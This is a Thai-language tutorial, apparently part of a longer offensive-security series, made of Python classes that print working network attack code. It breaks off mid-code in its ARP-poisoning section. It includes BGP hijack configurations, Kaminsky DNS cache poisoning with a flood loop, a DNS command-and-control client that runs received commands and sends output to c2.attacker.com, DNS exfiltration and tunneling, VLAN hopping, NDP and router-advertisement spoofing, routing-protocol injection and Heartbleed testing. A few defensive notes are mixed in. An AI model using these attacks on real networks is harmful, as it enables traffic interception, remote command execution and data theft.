# Part 51: Advanced Network Protocol Attacks (Steps 501-510)

## ภาพรวม
การโจมตี network protocols ขั้นสูง ครอบคลุม BGP hijacking, DNS attacks, VLAN hopping, IPv6 attacks และ man-in-the-middle techniques

---

## Step 501: BGP Hijacking and Route Manipulation

### อธิบาย
การทำความเข้าใจ BGP route manipulation และการตรวจจับ

```python
#!/usr/bin/env python3
# BGP Security Analysis

from scapy.all import *
from scapy.contrib.bgp import *
import socket
import struct

BGP_ATTACKS = [
    'BGP Route Hijacking - announce victim prefix from attacker AS',
    'BGP Prefix Subversion - more specific route announcement',
    'BGP Session Reset - TCP RST injection',
    'AS Path Forgery - craft fake AS_PATH attribute',
    'BGP Community Abuse - manipulate traffic engineering',
    'BGP MITM - intercept sessions via route injection',
]

BGP_SECURITY_TOOLS = {
    'BGPStuff': 'https://bgpstuff.net - BGP visibility tool',
    'RIPE NCC': 'https://stat.ripe.net - BGP analysis',
    'BGPStream': 'https://bgpstream.caida.org - route change monitoring',
    'Routinator': 'RPKI validator for BGP route origin validation',
    'GoBGP': 'Golang BGP implementation for testing',
    'bgpdump': 'BGP dump analysis tool',
}

class BGPSecurityAnalyzer:
    """BGP security analysis and route manipulation"""
    
    def craft_bgp_update(self, attacker_asn: int, prefix: str, victim_asn: int):
        """Craft BGP UPDATE message for route injection"""
        print(f"[*] Crafting BGP UPDATE for prefix: {prefix}")
        print(f"[*] Attacker ASN: {attacker_asn}, Victim ASN: {victim_asn}")
        
        update_notes = f"""
# BGP Route Hijacking via UPDATE message:
# 1. ต่อ BGP session กับ router
# 2. ส่ง OPEN message (announce AS {attacker_asn})
# 3. ส่ง UPDATE message:
#    - NLRI (Network Layer Reachability Info): {prefix}
#    - AS_PATH: {attacker_asn} (shorter or equal to legitimate)
#    - NEXT_HOP: attacker's router
#    - ORIGIN: IGP

# ผล: Internet ส่ง traffic ที่มุ่งไป {prefix} มายัง attacker router
# = traffic interception

# BGP Prefix Subversion (more specific):
# Target: 1.2.3.0/24
# Announce: 1.2.3.0/25 + 1.2.3.128/25 (more specific = preferred)

# ExaBGP for controlled BGP announcements
pip install exabgp

# exabgp.conf:
exabgp_config = '''
process announce-routes {{
    run /path/to/hijack.py;
    encoder json;
}}

neighbor 192.168.1.1 {{
    router-id {attacker_asn}.0.0.1;
    local-address 192.168.1.2;
    local-as {attacker_asn};
    peer-as 65000;
}}
'''
print(exabgp_config)
"""
        print(update_notes)
    
    def detect_bgp_hijacking(self, prefix: str):
        """Detect BGP prefix hijacking"""
        detection_cmds = f"""
# ตรวจสอบ BGP announcements สำหรับ {prefix}

# 1. BGPStuff check
curl https://bgpstuff.net/route/{prefix.replace('/', '%2F')}

# 2. RIPEstat API
curl 'https://stat.ripe.net/data/routing-status/data.json?resource={prefix}'

# 3. ใช้ bgpstream
python3 -c "
import pybgpstream
stream = pybgpstream.BGPStream(
    project='routeviews',
    collectors=['route-views2'],
    record_type='ribs',
    filter='prefix {prefix}'
)
for rec in stream.records():
    for elem in rec:
        print(elem)
"

# 4. ตรวจสอบ RPKI validity
curl 'https://rpki-validator.ripe.net/api/v1/validity/{prefix}'
# Result: valid, invalid, not-found
"""
        print(detection_cmds)
    
    def bgp_session_reset_attack(self, target_router: str, router_ip: str):
        """BGP Session Reset via TCP RST injection"""
        print(f"[*] BGP Session Reset Attack: {router_ip} -> {target_router}")
        
        # BGP ใช้ TCP port 179
        rst_attack = f"""
# TCP RST injection targeting BGP session (TCP/179)
# จำเป็นต้องรู้ TCP sequence number

from scapy.all import *

# ดู active BGP sessions
# netstat -an | grep :179

# Craft RST packet
rst = IP(src='{router_ip}', dst='{target_router}') / \\
      TCP(sport=55000, dport=179, flags='R', seq=<real_seq>)

# ส่ง
# send(rst, iface='eth0')

# Defense: TCP MD5 signatures on BGP sessions
# BGP Generalized TTL Security Mechanism (GTSM)
"""
        print(rst_attack)
    
    def rpki_validation_setup(self):
        """Setup RPKI route origin validation"""
        rpki_setup = """
# RPKI (Resource Public Key Infrastructure)
# ป้องกัน BGP prefix hijacking

# ติดตั้ง Routinator (RIPE NCC)
curl -sLO https://github.com/NLnetLabs/routinator/releases/latest/download/routinator-x86_64-unknown-linux-musl.tar.gz
tar xzf routinator-*.tar.gz
./routinator vrps --format json > /tmp/rpki_vrps.json

# หรือใช้ RTRlib (validator library)
./rtr-client 127.0.0.1 8282

# Configure router (Juniper example):
set routing-options autonomous-system 65000
set routing-options validation group RPKI-SERVERS session 192.0.2.1
set policy-options policy-statement RPKI-POLICY term VALID from validation-database valid
set policy-options policy-statement RPKI-POLICY term VALID then accept
set policy-options policy-statement RPKI-POLICY term INVALID from validation-database invalid
set policy-options policy-statement RPKI-POLICY term INVALID then reject
"""
        print(rpki_setup)
    
    def analyze_route_leaks(self, asn: int):
        """Analyze potential BGP route leaks"""
        analysis_cmd = f"""
# BGP Route Leak Detection for ASN {asn}

# หา routes ที่ originated จาก ASN ที่ไม่ควรปรากฎ

# Using RIPEstat
curl 'https://stat.ripe.net/data/announced-prefixes/data.json?resource=AS{asn}'

# Using BGPView
curl 'https://api.bgpview.io/asn/{asn}/prefixes'

# ตรวจสอบ: มี route ที่ไม่ได้อยู่ใน ROA (Route Origin Authorization) หรือไม่
# ROA verification:
curl 'https://rpki-validator.ripe.net/api/v1/validity/AS{asn}/1.2.3.0/24'
"""
        print(analysis_cmd)

if __name__ == '__main__':
    analyzer = BGPSecurityAnalyzer()
    analyzer.craft_bgp_update(attacker_asn=65500, prefix='1.2.3.0/24', victim_asn=65000)
    analyzer.detect_bgp_hijacking('1.2.3.0/24')
    analyzer.rpki_validation_setup()
    analyzer.analyze_route_leaks(asn=65000)
```

---

## Step 502: DNS Advanced Attacks

### อธิบาย
การโจมตี DNS ขั้นสูง ครอบคลุม cache poisoning, NXDOMAIN attacks, DNS tunneling

```python
#!/usr/bin/env python3
# Advanced DNS Attack Framework

from scapy.all import *
import random
import struct
import base64
import socket

DNS_ATTACKS = {
    'cache_poisoning': 'Inject false DNS records into resolver cache',
    'zone_transfer': 'Unauthorized AXFR to dump all DNS records',
    'dns_tunneling': 'Exfiltrate data via DNS TXT queries',
    'subdomain_takeover': 'Claim abandoned CNAME target',
    'nxdomain_attack': 'Flood resolver with non-existent domain queries',
    'dns_rebinding': 'Attack via DNS TTL manipulation for SSRF',
    'dkim_bypass': 'Spoof email via DKIM misconfiguration',
}

class AdvancedDNSAttacker:
    """Advanced DNS attack framework"""
    
    def dns_cache_poisoning(self, target_resolver: str, victim_domain: str, 
                            attacker_ip: str, source_port: int = None):
        """Kaminsky-style DNS cache poisoning"""
        print(f"[*] DNS Cache Poisoning: {victim_domain} -> {attacker_ip}")
        print(f"[*] Target resolver: {target_resolver}")
        
        # Kaminsky Attack:
        # 1. ส่ง query สำหรับ random subdomain (e.g., rand1234.victim.com)
        # 2. เดา resolver ส่ง query ไปยัง victim.com nameserver
        # 3. ก่อน reply จริงบอก flooding:
        #    - Match transaction ID (0-65535)
        #    - Provide ADDITIONAL section pointing victim.com NS to attacker
        
        poison_code = f"""
# Kaminsky DNS Cache Poisoning

import random
from scapy.all import *

target_resolver = '{target_resolver}'
victim_domain = '{victim_domain}'
attacker_ip = '{attacker_ip}'

def poison_attempt(txid: int, src_port: int):
    # Crafted DNS response
    response = IP(dst=target_resolver) / \\
               UDP(sport=53, dport=src_port) / \\
               DNS(
                   id=txid,
                   qr=1, aa=1,  # Response, Authoritative
                   qdcount=1, ancount=1, nscount=1, arcount=1,
                   qd=DNSQR(qname=f'rand{{txid}}.{victim_domain}', qtype='A'),
                   an=DNSRR(rrname=f'rand{{txid}}.{victim_domain}', type='A', 
                             rdata=attacker_ip, ttl=86400),
                   ns=DNSRR(rrname='{victim_domain}', type='NS',
                             rdata=f'ns1.{victim_domain}', ttl=86400),
                   ar=DNSRR(rrname=f'ns1.{victim_domain}', type='A',
                             rdata=attacker_ip, ttl=86400)
               )
    send(response, verbose=False)

# Trigger resolver to query
send(IP(dst=target_resolver)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=f'trigger.{victim_domain}')))

# Flood with poison attempts
for _ in range(10000):
    txid = random.randint(0, 65535)
    src_port = random.randint(1024, 65535)  # guess source port
    poison_attempt(txid, src_port)
"""
        print(poison_code)
        print("\n[!] Defense: DNSSEC, Source Port Randomization, 0x20 encoding")
    
    def dns_tunneling(self, domain: str, mode: str = 'exfiltrate'):
        """DNS tunneling สำหรับ C2 หรือ exfiltration"""
        print(f"\n[*] DNS Tunneling via: {domain}")
        
        if mode == 'exfiltrate':
            exfil_code = f"""
# Data Exfiltration via DNS
import socket, base64, struct

def exfiltrate_via_dns(data: bytes, c2_domain: str):
    # Base32 encode (DNS case-insensitive)
    chunks = [data[i:i+30] for i in range(0, len(data), 30)]
    
    for i, chunk in enumerate(chunks):
        encoded = base64.b32encode(chunk).decode().lower().rstrip('=')
        query = f"{{i}}.{{encoded}}.{{c2_domain}}"
        
        try:
            socket.gethostbyname(query)  # DNS query = exfiltration
        except:
            pass  # NXDOMAIN expected

# ใช้ dnscat2
git clone https://github.com/iagox86/dnscat2
# Server (attacker)
ruby dnscat2.rb {domain}

# Client (victim)
./dnscat2 --dns domain={domain} --secret=password

# หรือ iodine
# Server
iodined -f -c -P password 10.0.0.1 {domain}
# Client
iodine -f -P password {domain}
"""
            print(exfil_code)
        else:  # C2 mode
            c2_code = f"""
# DNS C2 Channel
import socket, time, base64, subprocess

C2_DOMAIN = '{domain}'

def get_command():
    # อ่าน command จาก TXT record
    import dns.resolver
    answers = dns.resolver.resolve(f'cmd.{C2_DOMAIN}', 'TXT')
    return base64.b64decode(str(answers[0]).strip('"'))

def send_result(result: bytes, cmd_id: str):
    # ส่ง result ผ่าน DNS subdomain
    chunks = [result[i:i+20] for i in range(0, len(result), 20)]
    for i, chunk in enumerate(chunks):
        encoded = base64.b32encode(chunk).decode().lower()
        query = f'{{i}}.{{cmd_id}}.{{encoded}}.result.{C2_DOMAIN}'
        try:
            socket.gethostbyname(query)
        except:
            pass

while True:
    cmd = get_command()
    output = subprocess.run(cmd, shell=True, capture_output=True)
    send_result(output.stdout, 'cmd1')
    time.sleep(60)
"""
            print(c2_code)
    
    def subdomain_takeover(self, target_domain: str):
        """Find and exploit subdomain takeover"""
        print(f"\n[*] Testing subdomain takeover for: {target_domain}")
        
        # เครื่องมือสำหรับค้นหา
        takeover_tools = f"""
# เครื่องมือสำหรับ Subdomain Takeover

# 1. subfinder + subjack
subfinder -d {target_domain} -o subdomains.txt
subjack \\
    -w subdomains.txt \\
    -t 100 \\
    -o /tmp/takeover_results.txt \\
    -ssl

# 2. nuclei templates
nuclei \\
    -l subdomains.txt \\
    -t /usr/share/nuclei-templates/takeovers/ \\
    -o /tmp/nuclei_takeover.txt

# 3. Can-I-Take-Over-XYZ
git clone https://github.com/EdOverflow/can-i-take-over-xyz
# ดูรายชื่อ services ที่เสี่ยง

# 4. Manual check:
# CNAME pointing to GitHub Pages with NXDOMAIN -> can take over
dig {target_domain} CNAME
# ถ้าชี้ไปยัง something.github.io และไม่ได้ claim -> เสี่ยง takeover
"""
        print(takeover_tools)
    
    def test_dns_zone_transfer(self, nameserver: str, domain: str) -> list:
        """Test DNS zone transfer (AXFR)"""
        print(f"\n[*] Testing zone transfer: {domain} @ {nameserver}")
        
        axfr_test = f"""
# DNS Zone Transfer Test
dig AXFR {domain} @{nameserver}

# หรือ host
host -t AXFR {domain} {nameserver}

# fierce (subdomains via zone transfer)
fierce --domain {domain}

# dnsrecon
dnsrecon \\
    -d {domain} \\
    -t axfr \\
    --ns {nameserver}

# dnsx
dnsx -d {domain} -axfr -resp
"""
        print(axfr_test)
        
        # สมมติเหมือนพบผลลัพธ์
        mock_records = [
            {'name': f'www.{domain}', 'type': 'A', 'value': '1.2.3.4'},
            {'name': f'mail.{domain}', 'type': 'A', 'value': '1.2.3.5'},
            {'name': f'dev.{domain}', 'type': 'A', 'value': '10.0.0.10'},
            {'name': f'vpn.{domain}', 'type': 'A', 'value': '1.2.3.6'},
        ]
        return mock_records
    
    def dns_rebinding_attack(self, domain: str, target_internal: str = '192.168.1.1'):
        """DNS Rebinding Attack for SSRF"""
        print(f"\n[*] DNS Rebinding Attack")
        
        rebinding_setup = f"""
# DNS Rebinding:
# 1. Setup domain {domain} with very short TTL (0-1s)
# 2. เริ่มต้น: {domain} -> attacker's real IP
# 3. หลัง browser โหลด page:
#    {domain} -> {target_internal} (rebind to internal IP)
# 4. Browser ยังคิดว่าเป็น same origin
# 5. JavaScript สามารถอ่าน http://{target_internal}/ ได้!

# เครื่องมือ:
# Singularity of Origin - DNS Rebinding framework
git clone https://github.com/nccgroup/singularity
cd singularity && npm install
node singularity.js -r rebind.html -d {domain}

# หรือใช้ DNSChef
pip install dnschef
dnschef \\
    --fakedomains {domain} \\
    --fakeip {target_internal} \\
    --logfile /tmp/dns_rebind.log
"""
        print(rebinding_setup)
    
    def dnssec_attack_testing(self, domain: str):
        """Test DNSSEC implementation"""
        dnssec_tests = f"""
# DNSSEC Testing

# Check DNSSEC signing
dig +dnssec {domain} A
dig DNSKEY {domain}
dig DS {domain}

# Verify chain of trust
dig +sigchase +topdown +dnssec {domain} A

# Check for vulnerabilities:
# 1. Weak key size (RSA < 2048 bits)
dig DNSKEY {domain} | grep -i 'algorithm\\|key'

# 2. Algorithm downgrade
# ถ้า resolver ไม่ยืนยัน signature -> vulnerability

# 3. Zone walking via NSEC
ldns-walk {domain} @nameserver  # enumerate records via NSEC

# 4. NSEC3 hash cracking
git clone https://github.com/EthanHeilman/nsec3walker
"""
        print(dnssec_tests)

if __name__ == '__main__':
    attacker = AdvancedDNSAttacker()
    attacker.dns_cache_poisoning('8.8.8.8', 'target.com', '192.168.100.10')
    attacker.dns_tunneling('c2.attacker.com', mode='exfiltrate')
    attacker.subdomain_takeover('target.com')
    attacker.test_dns_zone_transfer('ns1.target.com', 'target.com')
    attacker.dns_rebinding_attack('attacker.com', '192.168.1.1')
```

---

## Step 503: VLAN Hopping and 802.1Q Attacks

### อธิบาย
การโจมตี VLAN isolation เพื่อเข้าถึง network segments ที่ไม่ได้รับอนุญาต

```python
#!/usr/bin/env python3
# VLAN Hopping Attack Framework

from scapy.all import *
import struct

VLAN_ATTACKS = [
    'Double Tagging (802.1Q) - hop to native VLAN',
    'Switch Spoofing (DTP) - negotiate trunk port',
    'VLAN ACL bypass via trunk misconfiguration',
]

class VLANHoppingAttacker:
    """VLAN hopping attack implementation"""
    
    def double_tag_attack(self, outer_vlan: int, inner_vlan: int, 
                          target_ip: str, interface: str = 'eth0'):
        """Double-tag 802.1Q VLAN hopping"""
        print(f"[*] Double-tag attack: VLAN {outer_vlan} -> VLAN {inner_vlan}")
        print(f"[*] Target: {target_ip}")
        
        attack_code = f"""
# Double-Tag VLAN Hopping
# Requirement: Attacker on same VLAN as native VLAN (default: VLAN 1)

from scapy.all import *

# Craft double-tagged frame
outer_vlan = {outer_vlan}  # Native VLAN (switch will strip this)
inner_vlan = {inner_vlan}  # Target VLAN

packet = Ether(dst='ff:ff:ff:ff:ff:ff') / \\
         Dot1Q(vlan={outer_vlan}) / \\
         Dot1Q(vlan={inner_vlan}) / \\
         IP(dst='{target_ip}') / \\
         ICMP()

# ส่ง packet
sendp(packet, iface='{interface}')

# How it works:
# 1. Switch receives frame with outer tag = {outer_vlan} (native VLAN)
# 2. Switch strips outer tag (native VLAN = no need for tag)
# 3. Forwards to trunk port with remaining inner tag = {inner_vlan}
# 4. Frame arrives at destination switch with VLAN {inner_vlan} tag
# 5. Forwarded to VLAN {inner_vlan}!

# LIMITATION: One-way only (response can't come back)
"""
        print(attack_code)
    
    def switch_spoofing_dtp(self, interface: str = 'eth0'):
        """Switch Spoofing via DTP negotiation"""
        print(f"\n[*] Switch Spoofing via DTP on {interface}")
        
        dtp_attack = f"""
# DTP (Dynamic Trunking Protocol) Spoofing
# เพียงแค่รัน Yersinia

# ติดตั้ง Yersinia
apt-get install yersinia -y

# Interactive mode
yersinia -I
# เลือก DTP -> แล้วเลือก 'Enabling trunking'

# Non-interactive
yersinia dtp -attack 1 -interface {interface}

# หรือใช้ scapy
from scapy.all import *
# Craft DTP packet เพื่อ negotiate trunk

# หลังจาก trunk แล้ว -> เห็น traffic ทุก VLAN
"""
        print(dtp_attack)
    
    def arp_vlan_discovery(self, interface: str = 'eth0'):
        """ARP scan to discover VLAN topology"""
        scan_cmds = f"""
# VLAN Discovery

# 1. สเกน VLANs ที่สามารถ reach ได้
arp-scan --interface={interface} --localnet

# 2. ใช้ vlan-hopping.py
nmap -sn 10.0.0.0/8 -e {interface}

# 3. ดู VLAN configuration บน Cisco switches (ถ้ามี access)
show vlan brief
show interfaces trunk

# 4. 802.1Q VLAN tags ใน wireshark
# filter: vlan
"""
        print(scan_cmds)
    
    def vlan_hopping_defense(self):
        """VLAN hopping defense measures"""
        defense = """
# VLAN Hopping Defense

# 1. Disable DTP on access ports
switchport mode access
switchport nonegotiate  # ปิด DTP

# 2. เปลี่ยน native VLAN จาก VLAN 1
switchport trunk native vlan 999

# 3. Tag native VLAN traffic
vlan dot1q tag native

# 4. Limit VLANs บน trunk ports
switchport trunk allowed vlan 10,20,30

# 5. ปิด unused ports
interface range fa0/10-24
    shutdown
    switchport mode access
    switchport access vlan 999  # Black hole VLAN
"""
        print(defense)

if __name__ == '__main__':
    attacker = VLANHoppingAttacker()
    attacker.double_tag_attack(outer_vlan=1, inner_vlan=100, target_ip='10.100.0.1')
    attacker.switch_spoofing_dtp()
    attacker.arp_vlan_discovery()
    attacker.vlan_hopping_defense()
```

---

## Step 504: IPv6 Security Attacks

```python
#!/usr/bin/env python3
# IPv6 Security Testing Framework

from scapy.all import *
from scapy.layers.inet6 import *

IPV6_ATTACKS = [
    'NDP Spoofing (IPv6 equivalent of ARP spoofing)',
    'Router Advertisement Flood (DoS)',
    'SLAAC Attacks (rogue router)',
    'IPv6 Tunneling through IPv4 firewall',
    'ICMPv6 Redirect Attack',
    'DHCPv6 Starvation'
]

class IPv6SecurityTester:
    """IPv6 security attack framework"""
    
    def ndp_spoofing(self, target_ip6: str, gateway_ip6: str, interface: str = 'eth0'):
        """NDP (Neighbor Discovery Protocol) Spoofing"""
        print(f"[*] NDP Spoofing: {target_ip6} -> {gateway_ip6}")
        
        ndp_spoof_code = f"""
# NDP Spoofing (IPv6 ARP Poisoning)
from scapy.all import *
from scapy.layers.inet6 import *

def ndp_spoof(target: str, gateway: str, iface: str):
    # Get MAC addresses
    target_mac = getmacbyip6(target)
    
    # Craft Neighbor Advertisement
    na = IPv6(dst=target) / \\
         ICMPv6ND_NA(tgt=gateway, R=0, S=1, O=1) / \\
         ICMPv6NDOptDstLLAddr(lladdr=get_if_hwaddr(iface))
    
    while True:
        sendp(Ether(dst=target_mac)/na, iface=iface, verbose=False)
        time.sleep(2)

ndp_spoof('{target_ip6}', '{gateway_ip6}', '{interface}')

# หรือใช้ parasite6
parasite6 {interface}

# fake_router6 สำหรับ rogue router
fake_router6 {interface}
"""
        print(ndp_spoof_code)
    
    def rogue_router_advertisement(self, prefix: str, interface: str = 'eth0'):
        """Send fake Router Advertisement"""
        print(f"\n[*] Sending Rogue Router Advertisement: {prefix}")
        
        ra_attack = f"""
# Rogue Router Advertisement
# ส่ง RA เพื่อให้ clients ใช้ attacker เป็น default gateway

from scapy.all import *
from scapy.layers.inet6 import *

# Flood RA เพื่อ DoS (flood6)
flood6 -l -p 200 ra {interface}

# Rogue RA เพื่อ MITM
fake_router6 -A {interface} {prefix}/64

# Using radvd (legitimate router advertisement daemon)
cat > /tmp/radvd.conf << 'EOF'
interface {interface} {{
    AdvSendAdvert on;
    MinRtrAdvInterval 3;
    MaxRtrAdvInterval 10;
    AdvDefaultLifetime 9000;
    
    prefix {prefix}/64 {{
        AdvOnLink on;
        AdvAutonomous on;
    }};
}};
EOF

radvd -C /tmp/radvd.conf -n
"""
        print(ra_attack)
    
    def ipv6_tunnel_through_firewall(self, remote_endpoint: str):
        """Bypass IPv4 firewall via IPv6 tunneling"""
        print("\n[*] IPv6 tunneling techniques")
        
        tunnel_methods = f"""
# IPv6 tunneling to bypass IPv4-only firewall

# Method 1: 6in4 tunnel
ip tunnel add tun0 mode sit remote {remote_endpoint} local <local_ip> ttl 255
ip link set tun0 up
ip addr add 2001:db8::1/64 dev tun0
ip route add ::/0 via 2001:db8::2

# Method 2: Teredo tunneling
# Windows default has Teredo enabled
# สร้าง IPv6 connectivity ผ่าน UDP 3544

# Method 3: ISATAP
# IPv6 in IPv4 header, src = ISATAP address

# Method 4: 6to4
# ใช้ 192.88.99.0/24 anycast

# Detect: ตรวจหา IPv6 traffic ผ่าน IPv4 firewall
nmap -6 <target_ipv6>
"""
        print(tunnel_methods)
    
    def ipv6_recon(self, target_network: str):
        """IPv6 network reconnaissance"""
        recon_cmds = f"""
# IPv6 Reconnaissance

# 1. ICMPv6 ping to multicast (find all nodes)
ping6 -I eth0 ff02::1
ping6 -I eth0 ff02::2  # Routers only

# 2. NMap IPv6 scan
nmap -6 -sV {target_network}
nmap -6 -sn fe80::/64  # Link-local range

# 3. หา neighbors
ip -6 neigh show

# 4. เครื่องมือ THC IPv6
apt-get install thc-ipv6 -y
detect-new-ip6 eth0  # Monitor new IPv6 addresses
scanner6 eth0  # Scan IPv6 range
"""
        print(recon_cmds)

if __name__ == '__main__':
    tester = IPv6SecurityTester()
    tester.ndp_spoofing('2001:db8::100', '2001:db8::1')
    tester.rogue_router_advertisement('2001:db8::')
    tester.ipv6_tunnel_through_firewall('1.2.3.4')
    tester.ipv6_recon('fe80::/64')
```

---

## Step 505: OSPF/RIP Protocol Attacks

```python
#!/usr/bin/env python3
# Routing Protocol Security Testing

ROUTING_ATTACKS = [
    'OSPF Neighbor Injection - become OSPF peer without auth',
    'OSPF LSA Injection - inject false routing information',
    'RIPv2 Spoofing - send false routing updates',
    'EIGRP Neighbor Spoofing',
    'Route redistribution abuse',
]

class RoutingProtocolAttacker:
    """Routing protocol security testing"""
    
    def ospf_injection(self, router_ip: str, area_id: str = '0.0.0.0'):
        """OSPF route injection"""
        print(f"[*] OSPF Route Injection against {router_ip}")
        
        ospf_attack = f"""
# OSPF Route Injection via Loki
git clone https://github.com/c-skills/loki
cd loki && make

# ตรวจสอบ authentication
./loki-0.2.7 -i eth0 --ospf-auth-test

# Inject fake route
./loki-0.2.7 -i eth0 \\
    --inject-ospf \\
    --network 10.0.0.0 \\
    --mask 255.0.0.0 \\
    --next-hop <attacker_ip>

# หรือใช้ Scapy
from scapy.all import *
from scapy.contrib.ospf import *

# OSPF Hello เพื่อ become neighbor
hello = IP(dst='224.0.0.5') / \\
        OSPF_Hdr(type=1, src='{router_ip}', area='{area_id}') / \\
        OSPF_Hello(hellointerval=10, deadinterval=40)
send(hello)
"""
        print(ospf_attack)
    
    def ripv2_attack(self, interface: str = 'eth0'):
        """RIPv2 route injection"""
        rip_attack = f"""
# RIPv2 Route Injection

from scapy.all import *

# Inject default route via RIPv2
rip_update = IP(src='10.0.0.1', dst='224.0.0.9') / \\
             UDP(sport=520, dport=520) / \\
             RIP(cmd=2, version=2) / \\
             RIPEntry(
                 AF=2,
                 RouteTag=0,
                 addr='0.0.0.0',  # Default route
                 mask='0.0.0.0',
                 nextHop='<attacker_ip>',
                 metric=1  # Low metric = preferred
             )

send(rip_update, iface='{interface}')

# Defense: Authentication (MD5) for RIPv2
key chain RIP-KEY
    key 1
        key-string SecretPassword

router rip
    version 2
    authentication mode md5
    authentication key-chain RIP-KEY
"""
        print(rip_attack)
    
    def eigrp_attack(self, asn: int = 100):
        """EIGRP Neighbor Spoofing"""
        print(f"\n[*] EIGRP Attack (AS {asn})")
        
        eigrp_attack = f"""
# EIGRP (Enhanced Interior Gateway Routing Protocol)

# หา EIGRP neighbors
show ip eigrp neighbors
show ip eigrp topology

# Loki EIGRP attack
./loki -i eth0 --eigrp-inject \\
    --network 10.0.0.0/8 \\
    --metric 1 \\
    --as-number {asn}

# Defense: EIGRP MD5 Authentication
interface eth0
    ip authentication mode eigrp {asn} md5
    ip authentication key-chain eigrp {asn} MYCHAIN
"""
        print(eigrp_attack)

if __name__ == '__main__':
    attacker = RoutingProtocolAttacker()
    attacker.ospf_injection('10.0.0.1')
    attacker.ripv2_attack()
    attacker.eigrp_attack()
```

---

## Step 506: SSL/TLS Advanced Attacks

```python
#!/usr/bin/env python3
# SSL/TLS Security Testing Framework

import ssl
import socket
import struct
import subprocess

TLS_VULNERABILITIES = {
    'POODLE': 'SSLv3 padding oracle (CVE-2014-3566)',
    'BEAST': 'TLS 1.0 CBC IV prediction (CVE-2011-3389)',
    'CRIME': 'TLS compression info leakage',
    'DROWN': 'SSLv2 cross-protocol attack',
    'HEARTBLEED': 'OpenSSL memory disclosure (CVE-2014-0160)',
    'FREAK': 'Export cipher downgrade',
    'LOGJAM': 'DHE 512-bit downgrade',
    'LUCKY13': 'TLS CBC padding timing attack',
    'ROBOT': 'RSA PKCS#1 v1.5 decryption oracle',
}

class TLSSecurityTester:
    """SSL/TLS security assessment"""
    
    def __init__(self, target: str, port: int = 443):
        self.target = target
        self.port = port
    
    def run_testssl(self):
        """Run testssl.sh comprehensive scan"""
        print(f"[*] Running testssl.sh against {self.target}:{self.port}")
        
        testssl_cmd = f"""
# ติดตั้ง testssl.sh
git clone https://github.com/drwetter/testssl.sh
cd testssl.sh

# Full scan
./testssl.sh \\
    --severity CRITICAL \\
    --logfile /tmp/tls_results.txt \\
    {self.target}:{self.port}

# Check specific vulnerabilities
./testssl.sh --poodle {self.target}
./testssl.sh --heartbleed {self.target}
./testssl.sh --robot {self.target}
./testssl.sh --cipher-per-proto {self.target}

# Check certificate
./testssl.sh --check-cert {self.target}
"""
        print(testssl_cmd)
    
    def test_heartbleed(self) -> bool:
        """Test for Heartbleed vulnerability"""
        print(f"\n[*] Testing Heartbleed: {self.target}:{self.port}")
        
        # Heartbleed PoC payload
        heartbleed_payload = b'\x18\x03\x02\x00\x03\x01\x40\x00'
        
        heartbleed_script = f"""
# Heartbleed PoC (for authorized testing only)
python3 heartbleed_test.py -n {self.target} -p {self.port}

# หรือใซ้ Metasploit
msf6 > use auxiliary/scanner/ssl/openssl_heartbleed
msf6 auxiliary > set RHOSTS {self.target}
msf6 auxiliary > set RPORT {self.port}
msf6 auxiliary > set VERBOSE true
msf6 auxiliary > run

# Nmap
nmap -sV --script ssl-heartbleed -p {self.port} {self.target}
"""
        print(heartbleed_script)
        return False  # Placeholder
    
    def test_robot_vulnerability(self):
        """Test ROBOT vulnerability (RSA PKCS#1)"""
        print(f"\n[*] Testing ROBOT vulnerability")
        
        robot_test = f"""
# ROBOT (Return Of Bleichenbacher's Oracle Threat)
# CVE-2017-13099, CVE-2017-1000385

# ใช้ ROBOT scanner
git clone https://github.com/robotattack/robot-detect
pip install -r requirements.txt
python3 robot-detect.py {self.target}:{self.port}

# หรือ testssl
./testssl.sh --robot {self.target}
"""
        print(robot_test)
    
    def get_certificate_info(self) -> dict:
        """Get SSL certificate information"""
        print(f"\n[*] Getting certificate info for {self.target}")
        
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((self.target, self.port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=self.target) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
                    
                    print(f"[+] TLS Version: {version}")
                    print(f"[+] Cipher: {cipher}")
                    print(f"[+] Subject: {cert.get('subject', {})}")
                    print(f"[+] Expiry: {cert.get('notAfter')}")
                    
                    return {'version': version, 'cipher': cipher, 'cert': cert}
        except Exception as e:
            print(f"[-] Error: {e}")
            return {}
    
    def check_cipher_strength(self):
        """Check for weak ciphers"""
        cipher_check = f"""
# Check weak ciphers with sslscan
apt-get install sslscan -y
sslscan \\
    --no-failed \\
    --show-certificate \\
    {self.target}:{self.port}

# Nmap TLS checks
nmap -sV \\
    --script ssl-enum-ciphers \\
    -p {self.port} \\
    {self.target}

# Weak cipher grades:
# A = Strong TLS 1.2+ with AEAD
# B = TLS 1.2 with some weak ciphers
# C = TLS 1.1 or weak key exchange
# F = SSL3/TLS1.0 or export ciphers
"""
        print(cipher_check)

if __name__ == '__main__':
    tester = TLSSecurityTester('target.example.com', 443)
    tester.run_testssl()
    tester.test_heartbleed()
    tester.test_robot_vulnerability()
    tester.get_certificate_info()
    tester.check_cipher_strength()
```

---

## Step 507: ARP Poisoning and MITM

```python
#!/usr/bin/env python3
# ARP Poisoning and Man-in-the-Middle Framework

from scapy.all import *
import threading
import time
import os

class ARPMITMAttacker:
    """ARP poisoning and MITM attack framework"""
    
    def __init__(self, interface: str = 'eth0', gateway: str = '192.168.1.1'):
        self.interface = interface
        self.gateway = gateway
        self.gateway_mac = None
        self.target_mac = None
        self.running = False
    
    def get_mac(self, ip: str) -> str:
        """Get MAC address for IP"""
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
        arp_request_broadcast = broadcast / arp_request
        answered = srp(arp_request_broadcast, timeout=3, verbose=False)
        
        if answered[0]:
            return answered[0][0][1].hwsrc
        return None
    
    def poison_target(self, target_ip: str, poison_gateway: bool = True):
        """Perform ARP poisoning"""
        print(f"[*] ARP Poisoning: {target_ip} <-> {self.gateway}")
        
        # Get MACs
        self.gateway_mac = self.get_mac(self.gateway)
        self.target_mac = self.get_mac(target_ip)
        
        if not self.gateway_mac or not self.target_mac:
            print("[-] Could not get MAC addresses")
            return
        
        print(f"[+] Gateway MAC: {self.gateway_mac}")
        print(f"[+] Target MAC: {self.target_mac}")
        
        # Enable IP forwarding
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
        
